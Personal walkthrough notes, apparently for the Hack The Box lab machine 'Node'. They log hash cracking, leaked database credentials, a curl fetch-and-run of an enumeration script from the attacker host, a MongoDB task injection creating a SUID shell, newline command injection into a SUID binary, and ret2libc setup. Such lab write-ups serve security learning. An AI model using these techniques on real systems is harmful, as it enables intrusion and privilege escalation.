@@ -1,0 +1,406 @@
+Machine-Name : Node
+IP-Address   : 10.129.209.164
+
+Command-Line: sudo nmap 10.129.209.164 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Command-Line(~/HackingTools/dirsearch): ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 50 -i 200,301,302,403 -u http://10.129.206.208:3000
+Result:
+    ./recon/recon-1.txt
+
+BURPSUITE: ON
+Browser: http://10.129.209.164:3000
+PATHS FOUND:
+    /api/users/latest
+    /partials/home.html
+
+Broswer: http://10.129.209.164:3000/api/users/latest
+Result:
+    JSON:
+    0
+    _id	"59a7368398aa325cc03ee51d"
+    username	"tom"
+    password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
+    is_admin	false
+    1
+    _id	"59a7368e98aa325cc03ee51e"
+    username	"mark"
+    password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
+    is_admin	false
+    2
+    _id	"59aa9781cced6f1d1490fce9"
+    username	"rastating"
+    password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
+    is_admin	false
+
+Broswer: http://10.129.209.164:3000/api/users
+Result:
+  JSON:
+  0
+  _id	"59a7365b98aa325cc03ee51c"
+  username	"myP14ceAdm1nAcc0uNT"
+  password	"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"
+  is_admin	true
+  1
+  _id	"59a7368398aa325cc03ee51d"
+  username	"tom"
+  password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
+  is_admin	false
+  2
+  _id	"59a7368e98aa325cc03ee51e"
+  username	"mark"
+  password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
+  is_admin	false
+  3
+  _id	"59aa9781cced6f1d1490fce9"
+  username	"rastating"
+  password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
+  is_admin	false
+
+Notes: Analyzing the hashes using "hashid" reveals that the hashes are most likely SHA-256. Creating custom script to crack hashes.
+Result:
+    ./sha_256_decrypt.py
+
+Command-Line: python3 sha_256_decrypt.py
+Result:
+    myP14ceAdm1nAcc0uNT:
+    dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
+
+    tom:
+    f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
+
+    mark:
+    de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
+
+    rastating:
+    NO-CREDENTIALS
+
+Browser: http://10.129.209.164:3000/login
+Username: myP14ceAdm1nAcc0uNT
+Password: manchester
+Result:
+    *** WEB LOGIN SUCCESSFUL ***
+
+Notes: Downloading "backup"
+Result:
+    ./www/myplace_backup/myplace.backup.b64
+
+Command-Line: basse64 -d myplace.backup.b64 > myplace.backup.zip
+Notes: Zip file is password protected.
+
+Command-Line: sudo fcrackzip myplace.backup.zip -D -p '/usr/share/wordlists/rockyou.txt'
+Result:
+    possible pw found: magicword ()
+
+Command-Line: unzip myplace.backup.zip
+Password: magicword
+Result:
+    ./www/myplace_backup/var
+
+Command-Line(./www/myplace_backup/var/www/myplace/): cat app.js
+Notes: Interesting functions and variables found. Using MongoDB.
+Result:
+--------------------------------------------------------------------------------
+    Notes: Making some kind of function call as admin. Using "-q", "backup_key", and the input of a directory name.
+        app.get('/api/admin/backup', function (req, res) {
+        if (req.session.user && req.session.user.is_admin) {
+          var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+          var backup = '';
+
+          proc.on("exit", function(exitCode) {
+            res.header("Content-Type", "text/plain");
+            res.header("Content-Disposition", "attachment; filename=myplace.backup");
+            res.send(backup);
+          });
+
+          proc.stdout.on("data", function(chunk) {
+            backup += chunk;
+          });
+
+          proc.stdout.on("end", function() {
+          });
+        }
+        else {
+          res.send({
+            authenticated: false
+          });
+        }
+      });
+--------------------------------------------------------------------------------
+      Notes: Found user-agent "blacklist".
+        app.use(function (req, res, next) {
+        var agent = req.headers['user-agent'];
+        var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;
+--------------------------------------------------------------------------------
+      Notes: Found "backup_key" and credentials to SSH into "mark" account.
+      const express     = require('express');
+      const session     = require('express-session');
+      const bodyParser  = require('body-parser');
+      const crypto      = require('crypto');
+      const MongoClient = require('mongodb').MongoClient;
+      const ObjectID    = require('mongodb').ObjectID;
+      const path        = require("path");
+      const spawn        = require('child_process').spawn;
+      const app         = express();
+      const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+      const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+--------------------------------------------------------------------------------
+
+Command-Line: ssh mark@10.129.209.164
+Password: 5AYRft73VtFpc84k
+Result:
+    *** LOGIN SUCCESSFUL ***
+    mark@node:~$
+
+mark@node:~$ sudo -l
+Result:
+    Sorry, user mark may not run sudo on node.
+
+mark@node:~$ cd /dev/shm
+mark@node:/dev/shm$ whoami
+Result:
+    mark
+mark@node:/dev/shm$ id
+Result:
+    uid=1001(mark) gid=1001(mark) groups=1001(mark)
+mark@node:/dev/shm$ curl 10.10.14.99/LinEnum.sh -o LinEnum.sh
+mark@node:/dev/shm$ chmod +x LinEnum.sh
+mark@node:/dev/shm$ ./LinEnum.sh -t 1
+Result:
+[-] Running processes:
+    tom       1414  0.0  6.6 1024172 50648 ?       Ssl  15:59   0:03 /usr/bin/node /var/www/myplace/app.js
+    tom       1420  0.0  5.8 1009080 43968 ?       Ssl  15:59   0:03 /usr/bin/node /var/scheduler/app.js
+
+[-] SUID files:
+    -rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
+
+
+mark@node:/dev/shm$ cat /var/scheduler/app.js
+Result:
+    const exec        = require('child_process').exec;
+    const MongoClient = require('mongodb').MongoClient;
+    const ObjectID    = require('mongodb').ObjectID;
+    const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+    MongoClient.connect(url, function(error, db) {
+      if (error || !db) {
+        console.log('[!] Failed to connect to mongodb');
+        return;
+      }
+
+      setInterval(function () {
+        db.collection('tasks').find().toArray(function (error, docs) {
+          if (!error && docs) {
+            docs.forEach(function (doc) {
+              if (doc) {
+                console.log('Executing task ' + doc._id + '...');
+                exec(doc.cmd);
+                db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+              }
+            });
+          }
+          else if (error) {
+            console.log('Something went wrong: ' + error);
+          }
+        });
+      }, 30000);
+
+    });
+
+Notes: Found mongoDB credentials for Mark. Connecting to MongoClient. authSource = "scheduler". Executing task "doc.cmd" and then deleting the task in database "scheduler".
+
+mark@node:/dev/shm$ mongo -p -u mark myplace
+Password: 5AYRft73VtFpc84k
+Result:
+    *** SUCCESSFUL LOGIN ***
+    >
+
+> db.tasks.insert({"cmd":"cp /bin/dash /tmp/uk47; chmod 6755 /tmp/uk47; chmod u+s /tmp/uk47;"})
+Result:
+    WriteResult({ "nInserted" : 1 })
+
+mark@node:/dev/shm$ ls -la /tmp/uk47
+Result:
+    -rwsr-sr-x 1 tom tom 154072 Sep  4 20:49 /tmp/uk47
+
+mark@node:/dev/shm$ /tmp/uk47 -p
+$ id
+Result:
+    uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1000(tom) groups=1000(tom),1001(mark)
+$ whoami
+Result:
+    tom
+$ groups
+Result:
+    mark tom
+
+$ exit
+Result:
+    mark@node:/dev/shm$
+
+mark@node:/dev/shm$ mongo -p -u mark scheduler
+Password: 5AYRft73VtFpc84k
+
+> db.tasks.insert({"cmd":"chown tom:admin /tmp/uk47; chmod 6755 /tmp/uk47;"})
+> exit
+
+mark@node:/dev/shm$ /tmp/uk47 -p
+Result:
+    $ whoami
+        tom
+    $ id
+        uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
+    $ groups
+        mark admin
+
+Notes: We are now user "tom" in groups "admin" and "mark".
+
+$ file /usr/local/bin/backup
+Result:
+    /usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
+
+Notes: var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+
+Command-Line(./www/tom/backup): scp mark@10.129.209.164:/usr/local/bin/backup .
+Result: ./backup
+
+Command-Line(~/HTB/Machines/Node_P/www/tom/backup): gdb ./backup
+Result:
+    gdb-peda$
+
+gdb-peda$ checksec
+Result:
+    CANARY    : disabled
+    FORTIFY   : disabled
+    NX        : ENABLED
+    PIE       : disabled
+    RELRO     : Partial
+
+Command-Line(~/HackingTools/ghidra_10.0.2_PUBLIC): ./ghidraRun ~/HTB/Machines/Node_P/www/tom/backup/
+Notes: A list of characters blacklisted from running was found in "Functions/main".
+Blacklisted:
+    ..
+    /root
+    ;
+    &
+    `
+    $
+    |
+    //
+    /
+    /etc
+
+Notes: "/root" is banned but "root" itself is not. Going to "cd" into "/" and call "root".
+$ pwd
+/
+$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
+Result:
+    ./www/tom/backup/backup.b64
+
+Command-Line(./www/tom/backup): base64 -d backup.b64 > backup.unknown
+Command-Line(./www/tom/backup): file backup.unknown
+Result:
+    backup.unknown: Zip archive data, at least v1.0 to extract
+Command-Line(./www/tom/backup): mv backup.unknown backup.zip
+Command-Line(./www/tom/backup): unzip backup.zip
+Result:
+    Archive:  backup.zip
+    creating: root/
+    [backup.zip] root/.profile password:
+    inflating: root/.profile
+    inflating: root/.bash_history
+    creating: root/.cache/
+    extracting: root/.cache/motd.legal-displayed
+    extracting: root/root.txt
+    inflating: root/.bashrc
+    inflating: root/.viminfo
+    creating: root/.nano/
+    extracting: root/.nano/search_history
+
+Command-Line(./www/tom/backup): cat /root/root.txt
+Result:
+    1722e99ca5f353b362556a62bd5e6be0
+    *** ROOT OWNED ***
+
+Notes: Code does not blacklist line breaks and the end result is given to /dev/null.
+
+mark@node:~$ /tmp/uk47 -p
+$ whoami
+    tom
+$ id
+    uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
+$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "abcd
+> /bin/bash
+> abdc"
+Result:
+    zip warning: name not matched: abcd
+
+    zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_1024158445 . -i abcd)
+    root@node:~#
+    *** ROOT ACCESS ***
+
+root@node:~# cat /home/tom/user.txt
+Result:
+    e1156acc3574e04b06908ecf76be91b1
+    *** USER OWNED ***
+
+root@node:~# exit
+Result:
+    $
+
+$ whoami
+Result:
+    tom
+
+$ ldd /usr/local/bin/backup |grep libc.so.6
+Result:
+    libc_base_addr => 0xf75ba000
+
+libc_base_addr : 0xf75ba000
+
+$ readelf -s /lib32/libc.so.6 |grep system
+Result:
+       245: 00110820    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
+       627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+      1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+system_off : 0x0003a940
+
+$ readelf -s /lib32/libc.so.6 |grep exit
+Result:
+       112: 0002eba0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
+       141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+       450: 0002ebd0   181 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
+       558: 000af578    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
+       616: 00113840    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
+       652: 0002eb80    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
+       876: 0002e9d0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
+      1046: 0011d290    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
+      1394: 001b0204     4 OBJECT  GLOBAL DEFAULT   32 argp_err_exit_status@@GLIBC_2.1
+      1506: 000f19a0    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
+      2108: 001b0154     4 OBJECT  GLOBAL DEFAULT   32 obstack_exit_failure@@GLIBC_2.0
+      2263: 0002e7d0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
+      2406: 000f2db0     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
+
+exit_off : 0x0002e7d0
+
+$ strings -a -t x /lib32/libc.so.6 |grep /bin/sh
+Result:
+    15900b /bin/sh
+
+arg_off : 0x00015900b
+
+Notes: Variables placed into ./www/tom/buf.py .
+
+Command-Line(./www/tom/): cat buf.py | xclip -selection clipboard
+
+Notes: Copied contents of buf.py and wrote them into "$ /dev/shm/exploit.py"
+
+$ python exploit.py
+Result:
+    #
+    *** BUFFER OVERFLOW SUCCESSFUL ***
+    *** ROOT ACCESS ***
+
+      *** FINISHED ***
